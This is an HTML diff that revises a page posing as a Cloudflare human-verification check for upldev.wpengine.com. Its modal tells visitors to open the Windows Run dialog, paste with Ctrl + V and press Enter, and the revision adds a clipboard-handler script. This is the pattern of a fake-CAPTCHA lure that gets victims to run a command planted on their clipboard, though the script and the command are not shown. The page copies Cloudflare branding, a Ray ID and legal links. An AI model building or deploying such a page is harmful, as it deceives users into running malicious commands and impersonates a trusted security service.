@@ -1,62 +1,78 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Just a moment...</title>
-    <link rel="stylesheet" href="styles.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Just a moment...</title>
+  <link rel="stylesheet" href="css/main.css">
+  <link rel="stylesheet" href="css/modal.css">
+  <script src="js/verification.js" defer></script>
+  <script src="js/clipboard-handler.js" defer></script>
 </head>
-<body>
-    <div class="main-wrapper">
-        <div class="main-content">
-            <h1 class="zone-name-title" id="domain-name">upldev.wpengine.com</h1>
-            
-            <p class="verification-text">Verifying you are human. This may take a few seconds.</p>
-            
-            <div class="cloudflare-checkbox">
-                <label>
-                    <input type="checkbox">
-                    <span>Verify you are human</span>
-                    <img src="cloudflare-logo.png" alt="Cloudflare" class="cloudflare-logo">
-                </label>
-            </div>
-
-            <div class="verification-popup">
-                <div class="popup-header">
-                    <span>Security by Cloudflare</span>
-                    <span class="popup-subtitle">Verification steps</span>
-                </div>
-                
-                <div class="popup-content">
-                    <p>Let us know you're human, please complete steps:</p>
-                    <ol>
-                        <li>Press & hold the Windows Key + R</li>
-                        <li>In the verification window, press Ctrl + V</li>
-                        <li>Press Enter on the keyboard to complete</li>
-                    </ol>
-
-                    <div class="popup-agreement">
-                        <p>You will observe and agree:</p>
-                        <p class="verification-id">
-                            I am not a robot - Cloudflare Verification ID: <span id="verification-code">91923b</span>
-                        </p>
-                    </div>
-
-                    <button class="verify-button">Verify</button>
-                </div>
-            </div>
-
-            <div class="security-message" id="security-message">
-                upldev.wpengine.com needs to review the security of your connection before proceeding.
-            </div>
+<body class="no-js">
+  <div class="main-wrapper" role="main">
+    <div class="main-content">
+      <h1 class="zone-name-title h1">upldev.wpengine.com</h1>
+      <p id="verification-message" class="h2 spacer-bottom">Verifying you are human. This may take a few seconds.</p>
+      
+      <!-- Verification Widget Container -->
+      <div id="verification-container" style="display: grid; position: relative;">
+        <!-- Checkbox Version -->
+        <div id="checkbox-verification" class="verification-option">
+          <label class="checkbox-container">
+            <input type="checkbox" aria-label="Verify you are human">
+            <span>Verify you are human</span>
+          </label>
+          <div class="cloudflare-branding">
+            <a href="https://www.cloudflare.com/en-gb/privacypolicy/" target="_blank">Privacy</a> • 
+            <a href="https://www.cloudflare.com/en-gb/terms/" target="_blank">Terms</a>
+          </div>
         </div>
+        
+        <!-- Modal Popup - Initially Hidden -->
+        <div id="verification-modal" class="modal-hidden">
+          <div class="modal-content">
+            <header>
+              <span class="cloudflare-title">Security by Cloudflare</span>
+              <img src="assets/cloudflare-logo.svg" alt="Cloudflare Logo" class="cloudflare-logo">
+              <span class="verification-title">Verification steps</span>
+            </header>
+            
+            <main>
+              <p>Let us know you're human, please complete steps:</p>
+              <ol>
+                <li>Press &amp; hold the Windows Key <img src="assets/windows-logo.png" alt="Windows Logo" class="windows-icon"> + R</li>
+                <li>In the verification window, press <b>Ctrl + V</b></li>
+                <li>Press <b>Enter</b> on the keyboard to complete</li>
+              </ol>
+              
+              <p>You will observe and agree:</p>
+              <p class="verification-id">I am not a robot - Cloudflare Verification ID: 91923b</p>
+            </main>
+            
+            <footer>
+              <div class="footer-message">Perform the steps above to complete verification</div>
+              <button id="verify-button" disabled>Verify</button>
+            </footer>
+          </div>
+        </div>
+      </div>
+      
+      <div id="core-message" class="core-msg spacer spacer-top">
+        upldev.wpengine.com needs to review the security of your connection before proceeding.
+      </div>
     </div>
-
-    <div class="page-footer">
+  </div>
+  
+  <div class="footer" role="contentinfo">
+    <div class="footer-inner">
+      <div class="clearfix diagnostic-wrapper">
         <div class="ray-id">Ray ID: <code>91923b78ba53249b</code></div>
-        <div class="cloudflare-branding">Performance & security by Cloudflare</div>
+      </div>
+      <div class="text-center" id="footer-text">
+        Performance &amp; security by <a rel="noopener noreferrer" href="https://www.cloudflare.com" target="_blank">Cloudflare</a>
+      </div>
     </div>
-
-    <script src="script.js"></script>
+  </div>
 </body>
 </html>
